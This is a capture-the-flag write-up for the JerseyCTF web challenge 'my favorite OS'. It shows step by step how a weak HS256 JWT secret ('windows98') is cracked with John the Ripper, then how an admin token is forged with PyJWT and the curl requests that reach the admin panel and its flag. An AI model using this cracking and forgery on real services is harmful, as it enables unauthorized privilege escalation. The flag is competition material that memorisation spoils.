# My Favorite OS — JerseyCTF Writeup

**Challenge:** my favorite OS  
**Category:** web  
**Difficulty:** Easy  
**Points:** 467  
**Solves:** 42  
**Challenge Author:** reee  
**Writeup by:** zham  
**Flag:** `jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}`

---

## Description

> I love old operating systems, especially Windows 98! I had to disable some old administrator legacy endpoints...or did I?

---

## Background Knowledge (Read This First!)

### What is a JWT?

A **JSON Web Token (JWT)** is a signed token with three base64url-encoded sections — header, payload, and signature — separated by dots:

```
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyIjoiZ3Vlc3QifQ . <HMAC-SHA256 signature>
     header                    payload                     signature
```

The header and payload are just base64 — anyone can read them. The **signature** is what prevents tampering, but only if the signing secret is strong enough.

### What is JWT Secret Cracking?

JWT tokens signed with `HS256` use a shared secret to produce the signature. If the secret is a common word, tools like **John the Ripper** can crack it from the token itself — no server access needed. Once you have the secret, you can forge any payload you want and sign it validly.

To crack a JWT:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

---

## Solution — Step by Step

### Step 1 — Get a Valid JWT as Guest

The terminal UI shows an example: `POST /api/v1/login username=guest password=guest`. Trying it:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl -X POST http://my-favorite-os.aws.jerseyctf.com/api/v1/login \
> -d "username=guest&password=guest"
{"message":"Login successful","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjUzNTM0OX0.MkzLpKs6K_SbbDeU1NRWU-XNI6Z-I0EaGRIbzPAXoak"}
```

Decoding the payload reveals `"role":"user"`:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ echo "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjUzNTM0OX0" | base64 -d
{"user":"guest","role":"user","iat":1776535349}
```

### Step 2 — Probe the Admin Endpoint

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://my-favorite-os.aws.jerseyctf.com/admin/panel \
> -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjUzNTM0OX0.MkzLpKs6K_SbbDeU1NRWU-XNI6Z-I0EaGRIbzPAXoak"
{"error":"403 Forbidden"}
```

The endpoint exists but requires `"role":"admin"`. Trying `alg: none` attack fails:

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://my-favorite-os.aws.jerseyctf.com/admin/panel \
> -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ."
{"error":"403 Forbidden","reason":"Unsupported algorithm: none"}
```

### Step 3 — Crack the JWT Secret with John the Ripper

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjUzNTM0OX0.MkzLpKs6K_SbbDeU1NRWU-XNI6Z-I0EaGRIbzPAXoak" > jwt.txt

┌──(zham㉿kali)-[/media/sf_downloads]
└─$ john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
windows98        (?)
1g 0:00:00:00 DONE
Session completed.
```

The JWT secret is **`windows98`** — fitting for a Windows 98-themed challenge.

### Step 4 — Forge an Admin Token

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ nano forge.py
```

```python
import jwt
secret = 'windows98'
token = jwt.encode({'user':'guest','role':'admin'}, secret, algorithm='HS256')
print(token)
```

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ python3 forge.py
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.v5oESxCVqw1Buo-Tdc1K55OvUiwcp9cxdS3opDK4aiE
```

### Step 5 — Access the Admin Panel

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://my-favorite-os.aws.jerseyctf.com/admin/panel \
> -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.v5oESxCVqw1Buo-Tdc1K55OvUiwcp9cxdS3opDK4aiE"
<body style="background:#000080;color:white;font-family:monospace;padding:20px">
  <h1 style="color:#ffff00"> ADMIN PANEL</h1>
  <p>Welcome, guest!</p>
  <div style="background:#000;border:2px solid #0f0;padding:16px;font-size:1.2em">
    <b style="color:#0f0">jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}</b>
  </div>
</body>
```

---

## Flag

```
jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `curl` | Send HTTP requests and test endpoints | ⭐ Easy |
| `base64 -d` | Decode JWT payload to read claims | ⭐ Easy |
| `john` | Crack the JWT HMAC-SHA256 secret | ⭐⭐ Medium |
| `python3 + pyjwt` | Forge a new token with admin role | ⭐ Easy |

---

## Key Takeaways

- **Weak JWT secrets are crackable in seconds.** If the signing secret is a common word — even a thematic one like `windows98` — rockyou.txt will find it instantly.
- **`alg: none` is not always the answer.** Modern libraries explicitly block it — cracking the secret is the more reliable path.
- **The challenge hinted at the secret.** The Windows 98 theme was a direct clue pointing to `windows98` as the password.
- **John the Ripper supports JWT natively** with `--format=HMAC-SHA256`. No extra plugins needed.
